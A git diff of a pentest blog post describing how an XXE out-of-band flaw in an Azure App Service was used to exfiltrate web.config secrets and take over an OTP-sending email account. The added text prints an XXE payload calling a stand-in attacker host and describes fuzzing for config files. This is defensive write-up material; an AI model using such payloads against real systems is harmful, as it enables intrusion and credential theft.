@@ -19,16 +19,16 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
 
     
-     <head>
+     
+<head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <title>Compromising an Azure Tenant via XXE OOB and web.config Exfiltration</title>
-  <meta name="description" content="A real-world exploitation of an XXE vulnerability in Azure App Service that led to full tenant compromise through the exfiltration of secrets in web.config.">
+  <meta name="description" content="">
 
-  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.177ad2aeadd300ee319ed831846860970fa6821ccfd6c7020768535da778d79a.css" integrity="sha256-F3rSrq3TAO4xntgxhGhglw&#43;mghzP1scCB2hTXad415o=">
 </head>
-
 
     
     <style>
@@ -296,89 +296,189 @@
   <h1 class="text-4xl font-bold mb-4">Compromising an Azure Tenant via XXE OOB and web.config Exfiltration</h1>
   <p class="text-sm text-gray-400 mb-8">May 26, 2025</p>
   <div class="prose dark:prose-invert max-w-none">
-    <p>In this post, I’ll walk you through how an <strong>XML External Entity (XXE)</strong> vulnerability with <strong>Out-of-Band (OOB)</strong> exfiltration capabilities led to the compromise of an <strong>Azure tenant</strong> during a hybrid penetration test engagement. This assessment combined gray-box testing—where I was provided with an Azure account with Reader permissions on the subscription hosting the virtual machines—with black-box testing against several publicly exposed domains, all authorized within the same scope.</p>
-<h1 id="before-entering-the-lagoon"><strong>Before Entering the Lagoon</strong></h1>
-<h3 id="what-is-xxe-external-entity-injection">What is XXE (External Entity Injection)</h3>
-<p><strong>XML external entity (XXE) vulnerabilities</strong> (also called XML external entity injections or XXE injections) happen if a web application or API accepts unsanitized XML data and its back-end XML parser is configured to allow external XML entity parsing. XXE vulnerabilities can let malicious hackers perform attacks such as server-side request forgery (SSRF), local file inclusion (LFI), directory traversal, remote code execution (RCE), network port scanning, and denial of service (DoS).</p>
-<h3 id="what-is-oob-xxe">What is OOB XXE?</h3>
-<p><strong>Out-of-band XML external entity (OOB XXE)</strong> vulnerabilities are a type of XXE vulnerability where the attacker does not receive an immediate response to the XXE payload.</p>
-<pre><code>Roses are red,&lt;br&gt;
-Violets are blue,&lt;br&gt;
-Sugar is sweet,&lt;br&gt;
-And so are you.
+    <hr>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>Introduction</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> During a recent pentest engagement for a transactional company fully hosted in Microsoft Azure,
+ we were assigned to conduct both an external black-box assessment and an authenticated gray-box
+ evaluation within a two-week window. The scope included all publicly exposed services  as  well 
+ as internal resources accessible to authenticated users with least-privilege roles.
 
-
-OOB XXE is sometimes confused with blind XXE due to the lack of a direct response.
-With blind XXE, the attacker does not receive any response at all. Instead, they 
-reconstruct sensitive data step-by-step based on the behavior of 
-the 
-targeted app, such as the web server and XML parser errors it generates.
+ The  initial   phase   of  the   assessment  followed  our  standard  methodology,  encompassing 
+ reconnaissance, service enumeration, fingerprinting, and testing  for  common  
+ misconfigurations.
+ Early in the  process,  we uncovered  several  high and critical vulnerabilities such  as overly 
+ permissive CORS policies on certain subdomains, SQL  injection  points,  and  multiple instances 
+ of  exposed  personally  identifiable  information  (PII).  While  these  findings  were serious,
+ what followed DRAMATICLLY escalated the severity of the engagement.
 </code></pre>
-<p>The process for exploiting out-of-band XXE vulnerabilities is similar to using parameter entities with in-band XXE.</p>
-<p>While in-band XXE can be used to conduct denial of service (DoS) and server-side request forgery (SSRF) attacks against web apps and APIs, the primary goal of OOB XXE is sensitive data exfiltration.</p>
-<h3 id="email-sender-very-important-to-understand-in-this-engagement">Email Sender (Very Important to Understand in this Engagement)</h3>
-<pre><code>An email sender is an automated email account configured to send system-generated messages on behalf of a company or application. It is not typically linked to a real person, but rather used by back-end services, platforms, or cloud applications to 
-perform automated communications.
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/giphy.gif" alt="Texto alternativo"></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>Finding the Weak Link</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> While manually inspecting publicly accessible resources, our team leader stumbled upon an exposed 
+ WordPress directory (/wp-content/) on one  of  the  subdomains.  Among  the  files  available, we 
+ discovered detailed API documentation for  a  legacy  transactional  endpoint  used  for  payment 
+ processing. This API accepted XML-formatted requests—a known red flag if improperly sanitized.
+
+ The documentation outlined each field and processing step the server  performed  on  incoming XML 
+ data. This was instrumental in constructing valid requests and ultimately crafting  a  successful 
+ XML External Entity (XXE) payload.
+
+ After several rounds of trial and error, we  validated  that  the  server  was parsing XML without
+ disabling external entity resolution. More importantly, the payload could trigger an out-of-band 
+ (OOB) interaction with an attacker-controlled domain, confirming an XXE OOB vulnerability.
 </code></pre>
-<p><strong>Common Use Cases for an Email Sender:</strong></p>
-<pre><code>Password recovery:
-Sends password reset links or OTPs (One-Time Passwords) during account recovery workflows.
-
-System notifications:
-Alerts about suspicious login attempts, configuration changes, or billing events.
-
-Transaction confirmations:
-Sends purchase confirmations, payment receipts, or booking details.
-
-Internal processes:
-Delivers scheduled reports, automated alerts, or task assignment emails.
-
-Client communication:
-Sends welcome emails, appointment reminders, or automated follow-ups (often handled via email platforms like SendGrid or Mailchimp).
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>XXE OOB Explained</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> An XML External Entity (XXE) injection occurs when XML input containing a reference to an external
+ entity is processed by a weakly configured parser. If entity  expansion  is  enabled,  it  becomes 
+ possible to exfiltrate sensitive data from the file  system,  interact with  internal services, or 
+ even perform SSRF (server-side request forgery).
 </code></pre>
-<p>The attack chain began with a vulnerable endpoint hosted on an Azure App Service, which enabled the exfiltration of a web.config file through XXE. This configuration file exposed sensitive credentials, including access to a production database and a sender email account used for delivering OTPs (One-Time Passwords) during password recovery processes. These credentials facilitated further exploration and escalation within the target environment.</p>
-<p>During a cloud security assessment of an application deployed in <strong>Azure App Service</strong>, an authenticated <code>POST</code> endpoint was
-found to be processing XML input without proper validation. The endpoint accepted user-supplied XML and was vulnerable to XXE attacks.</p>
-<p>The structure of the XML request was deduced through public documentation and trial-and-error, which enabled the crafting of a malicious payload referencing an external DTD hosted on a controlled server.</p>
-<h3 id="exploiting-the-xxe-vulnerability-oob-exfiltration">Exploiting the XXE Vulnerability (OOB Exfiltration)</h3>
-<p>A payload was crafted to perform <strong>Out-of-Band (OOB)</strong> exfiltration using an external entity pointing to a listener server. This allowed reading internal files from the App Service environment, confirming the vulnerability by extracting:</p>
-<ul>
-<li><code>C:\Windows\win.ini</code> (for verification)</li>
-<li><code>web.config</code> (primary objective)</li>
-</ul>
-<h3 id="secrets-found-in-webconfig">Secrets Found in <code>web.config</code></h3>
-<p>The extracted configuration file contained:</p>
-<ul>
-<li><strong>Database connection strings</strong> with valid credentials</li>
-<li><strong>SMTP credentials</strong> for a sender email account</li>
-</ul>
-<p>This sender email address was discovered to be used in critical flows—specifically for sending OTPs during password resets. With control over this account, an attacker could:</p>
-<ul>
-<li>Intercept password reset tokens</li>
-<li>Replay OTPs if they were not properly invalidated</li>
-<li>Access user reset histories via the &ldquo;Sent Items&rdquo; folder</li>
-</ul>
-<h3 id="security-impact">Security Impact</h3>
-<ul>
-<li>Unauthorized access to the production database</li>
-<li>Complete takeover of an email sender used for OTP delivery</li>
-<li>High risk of <strong>account takeover</strong></li>
-<li>Exposure of plaintext credentials in a cloud-hosted environment</li>
-</ul>
-<hr>
-<h3 id="-recommendations">🛠 Recommendations</h3>
-<ul>
-<li>Disable <code>XmlResolver</code> or any external entity resolution in all XML parsers</li>
-<li>Validate all XML input strictly using schemas (XSD)</li>
-<li>Avoid storing secrets in application files; use <strong>Azure Key Vault</strong></li>
-<li>Leverage <strong>Managed Identity</strong> to securely handle resource access</li>
-<li>Regularly monitor and alert on access to sensitive configuration files</li>
-</ul>
-<hr>
-<h3 id="-final-thoughts">📌 Final Thoughts</h3>
-<p>This real-world case demonstrates how a seemingly low-impact vulnerability like XXE can result in full compromise when combined with misconfigurations and poor secret management practices. In modern cloud environments, secure coding practices and proper secret storage are essential to reducing exposure.</p>
-<hr>
-<p>🔥 Want a deep dive into the payloads and listener setup? Stay tuned for my next blog: <strong>&ldquo;XXE Payloads Against Azure App Services: From Theory to Impact.&rdquo;</strong></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/xxeoob.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> Out-of-Band XXE, also known as OOB-XXE, is a special subtype where the server does not return data 
+ directly in the HTTP response. Instead, the attacker defines an external DTD that causes the server
+ to send data to an external listener under the attacker’s control.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>The following payload was used to confirm the vulnerability:</strong></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>XXE PAYLOAD</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre tabindex="0"><code class="language-<?xml" data-lang="<?xml">&lt;!DOCTYPE test [
+  &lt;!ENTITY xxe SYSTEM &#34;http://attacker.oastify.com&#34;&gt;]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>DTD USED:</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/dtd.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> Once this was triggered, we received a callback on our  OAST  collaborator  client,  confirming the 
+ vulnerability.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>Escalation Through Azure Path Mappings</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> At this point, we had confirmed an OOB XXE vulnerability on an  Azure-hosted  App  Service.  However, 
+ even though initial attempts to exfiltrate files  like  C:\inetpub\wwwroot\web.config  or  .env  yielded limited 
+ results due to restricted access, nonstandard file placement and non juicy content found on the principal directory.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/p1.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> As part of our gray-box privileges, we had reader-level access to the target Azure subscription.  We 
+ pivoted to Azure’s App Service blade in the Azure Portal and  examined  the  configuration  of   the 
+ vulnerable app. Under &quot;Configuration&quot; &gt; &quot;Path Mappings&quot;, we noticed the  presence  of  custom  mount 
+ points. These mappings redirected the file structure  of the app to specific  Azure  File  shares or 
+ Blob containers.
+</code></pre>
+<p><img src="/images/posts/pmappings.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p>This blog has way more information about it:
+<a href="https://medium.com/@barbieri.santiago/configuring-path-mappings-in-azure-app-service-7bea90f58f26">https://medium.com/@barbieri.santiago/configuring-path-mappings-in-azure-app-service-7bea90f58f26</a>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><strong>This was the pivot point.</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> Knowing the mount paths, we began aggressively  fuzzing  through  the  directories, experimenting 
+ with variations of high-value filenames such as  web.config,  appsettings.json,  and  secrets.env. 
+ Each attempt heightened the anticipation—until finally,  one  of  the  crafted  payloads  hit  the 
+ jackpot. Through the XXE vector, the server responded, revealing a complete web.config file. This 
+ was the turning point. The presence of sensitive  configuration  data,  credentials,  and  internal 
+ paths confirmed we had successfully breached a critical layer of the application.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/dumps.gif" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><strong>JUICY CONTENT</strong></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/p2.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/p3.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/p4.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>The Treasure Trove</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> The contents of the web.config were significant. Among the sensitive items identified:
+
+ - Production database connection strings (with plaintext credentials)
+
+ - SMTP server login credentials for sender@company.com
+
+ Upon testing the SMTP credentials, we confirmed they provided access to a functioning corporate email 
+ account. After logging in, we  found  emails  related  to password  resets,  OTP  (One-Time Password) 
+ deliveries, and sensitive operational  correspondence.  The sender  account  was  tied  to  automated 
+ workflows involving password recovery and account verification.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<img src="/images/posts/otp.png" alt="Texto alternativo">
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> This dramatically increased the impact of the compromise, as it could enable:
+
+ - Unauthorized access to protected user accounts via OTP interception
+
+ - Replay of password reset links and one-time secrets
+
+ - Potential lateral movement via internal email phishing
+
+ - Full access to production database environments
+
+ - Responsible Disclosure and Engagement Termination
+
+ Upon testing the SMTP credentials, we confirmed they provided access to a functioning corporate email 
+ account. After logging in, we  found  emails  related  to  password  resets,  OTP  (One-Time Password) 
+ deliveries, and sensitive operational  correspondence.  The  sender  account  was  tied  to  automated 
+ workflows involving password recovery and account verification, making it a critical asset in the user
+ authentication process.
+
+ Interestingly, although the web.config also contained database credentials, we weren’t able to establish
+ a connection to the DB. After some digging, we realized the server was protected by IP  whitelisting  so
+ unless we were connecting from an allowed IP, the DB wasn’t even going to talk to us.
+
+ We considered techniques to evade those defenses like rotating outbound IPs through cloud  services  or 
+ tunneling through a compromised app—but time wasn’t on our side. With the clock ticking down, we had to
+ prioritize and move forward, documenting the impact and leaving that potential vector for a future 
+ engagement.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>Lessons Learned</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> -Never expose internal API documentation—especially not with detailed request formats.
+
+ -Disable XmlResolver and external entity parsing by default in all XML parsers.
+
+ -Use Azure Key Vault for secret storage, not web.config or .env files.
+
+ -Audit and limit path mappings, as they often expose sensitive file systems.
+
+ -Secure email accounts used in automated processes, especially those involved in password recovery workflows.
+</code></pre>
+<p><img src="/images/posts/b.png" alt="Texto alternativo">
+<strong>Conclusion</strong>
+<img src="/images/posts/b.png" alt="Texto alternativo"></p>
+<pre><code> This engagement highlights how a relatively obscure vulnerability like XXE can lead to full environment 
+ compromise when combined with misconfigurations, poor secret hygiene, and underused RBAC controls. In 
+ cloud-native environments, developers and security teams must align on secure-by-default principles and 
+ continuously monitor for indicators of exposure.
+
+ This case was a strong reminder that Azure App Services, like any other hosting environment, are only as 
+ secure as their weakest link. And sometimes, that link is just one web.config file away.
+</code></pre>
 
   </div>
 </article>
